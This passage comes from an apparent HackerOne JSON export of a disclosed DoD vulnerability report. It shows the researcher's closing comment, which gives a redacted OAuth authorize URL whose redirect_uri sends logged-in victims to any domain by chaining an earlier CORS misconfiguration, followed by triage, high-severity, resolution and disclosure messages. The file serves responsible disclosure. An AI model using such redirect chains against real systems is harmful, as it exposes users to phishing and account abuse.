URL.\u003c/p\u003e\n\n\u003cp\u003eWhen visited, this link will automatically redirect our logged-in victim to any domain. In this case, https://█████████\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://████████/████/api/authorize?response_type=\u0026amp;client_id=███\u0026amp;redirect_uri=https://████████\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eDemos:\u003c/strong\u003e\u003cbr\u003e\n\u003cem\u003eAPI Application Creation:\u003c/em\u003e\u003cbr\u003e\n███\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eList API Applications:\u003c/em\u003e\u003cbr\u003e\n████████\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eRedirect:\u003c/em\u003e\u003cbr\u003e\n████████\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eOverall quite a lot of work to craft a simple URL that will redirect a \u003cem\u003elogged-in\u003c/em\u003e victim to any webpage.. but the point here is that by continuing to leverage the original CORS misconfiguration we can rain down further annoyance- and potentially exploitation too- on our victim user.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-10T04:40:17.821Z","updated_at":"2020-05-14T17:13:59.104Z","actor":{"username":"waymobetta","cleared":false,"url":"/waymobetta","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fu9uQtHGzgVR2rNu2Mcetg2o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6277175,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-11T13:14:30.008Z","updated_at":"2019-11-11T13:14:30.008Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":562597},"actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6277430,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","markdown_message":"\u003cp\u003eGreetings,\u003c/p\u003e\n\n\u003cp\u003eWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\u003c/p\u003e\n\n\u003cp\u003eThank you for bringing this vulnerability to our attention!\u003c/p\u003e\n\n\u003cp\u003eWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\u003c/p\u003e\n\n\u003cp\u003eYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\u003c/p\u003e\n\n\u003cp\u003eThanks again for supporting the DoD Vulnerability Disclosure Program.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eThe VDP Team\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-11T13:46:50.169Z","updated_at":"2019-11-11T13:46:50.169Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6890621,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","markdown_message":"\u003cp\u003eGood news!\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\u003c/p\u003e\n\n\u003cp\u003eThank you for your time and effort to improve the security of the DoD information network.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eThe VDP Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-28T12:53:55.204Z","updated_at":"2020-01-28T12:53:55.204Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"waymobetta","url":"/waymobetta"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6952506,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T17:36:46.660Z","updated_at":"2020-02-03T17:36:46.660Z","first_to_agree":true,"actor":{"username":"waymobetta","cleared":false,"url":"/waymobetta","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fu9uQtHGzgVR2rNu2Mcetg2o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8002503,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for participating in the DoD Vulnerability Disclosure Program. We're publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at VDP-Questions@dc3.mil if there are any questions, concerns or issues.","markdown_message":"\u003cp\u003eThanks for participating in the DoD Vulnerability Disclosure Program. We\u0026#39;re publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at \u003ca title=\"VDP-Questions@dc3.mil\" href=\"mailto:VDP-Questions@dc3.mil\" rel=\"nofollow noopener noreferrer\"\u003eVDP-Questions@dc3.mil\u003c/a\u003e if there are any questions, concerns or issues.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-14T17:15:14.115Z","updated_at":"2020-05-14T17:15:14.115Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8002504,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-14T17:15:14.238Z","updated_at":"2020-05-14T17:15:14.238Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8002507,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-14T17:15:19.712Z","updated_at":"2020-05-14T17:15:19.712Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}